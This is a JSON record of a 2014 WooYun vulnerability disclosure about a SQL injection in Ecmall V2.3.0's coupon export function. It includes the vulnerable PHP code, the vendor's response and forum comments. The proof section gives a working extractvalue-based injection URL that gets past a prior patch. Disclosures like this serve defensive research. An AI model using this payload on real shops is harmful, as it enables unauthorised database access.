{"id": 866, "wybug_id": "wooyun-2014-067931", "wybug_title": "Ecmall V2.3.0-UTF8 正式版SQL注入漏洞之四", "wybug_corp": "ShopEx", "wybug_author": "HackBraid", "wybug_date": "2014-07-09 22:59", "wybug_open_date": "2014-10-07 23:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-07：\t细节向公众公开  简要描述： RT 20140618补丁绕过再来一发 详细说明：  漏洞位于coupon.app.php:\nfunction export()    {        $coupon_id = isset($_GET['id']) ? trim($_GET['id']) : '';// coupon_id未过滤        if (empty($coupon_id))        {            echo Lang::get('no_coupon');            exit;        }        if (!IS_POST)        {            header(\"Content-Type:text/html;charset=\" . CHARSET);            $this->assign('id', $coupon_id);            $this->display('coupon_export.html');        }        else        {            $amount = intval(trim($_POST['amount']));            if (empty($amount))            {                $this->pop_warning('involid_data');                exit;            }            $info = $this->_coupon_mod->get_info($coupon_id);            $coupon_name = ecm_iconv(CHARSET, 'gbk', $info['coupon_name']);            header('Content-type: application/txt');            header('Content-Disposition: attachment; filename=\"coupon_' .date('Ymd'). '_' .$coupon_name.'.txt\"');            $sn_array = $this->generate($amount, $coupon_id);            $crlf = get_crlf();            foreach ($sn_array as $val)            {                echo $val['coupon_sn'] . $crlf;            }        }    }\n   漏洞证明：  绕过方法：1.updatexml函数 2.extractvalue函数以extractvalue为例：http://localhost/ecmall/index.php?app=coupon&act=export&id=1/**/and/**/extractvalue(1,concat(0x7e,user()))#\n\n   修复方案：  intval   版权声明：转载请注明来源 HackBraid@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2014-07-09 23:18 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快处理谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-09 23:18 |    \t\tkimdle \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | @kimdle)\t\t \n  快忽略啊。    \n     2014-07-09 23:19 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  这么晚了还在工作，膩害    \n     2014-07-09 23:45 |    \t\tkimdle \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | @kimdle)\t\t \n  @HackBraid 致敬！    \n     2014-07-10 00:24 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  洞主8k的节奏么    \n     2014-07-21 17:04 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  封贴，楼下是二货    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}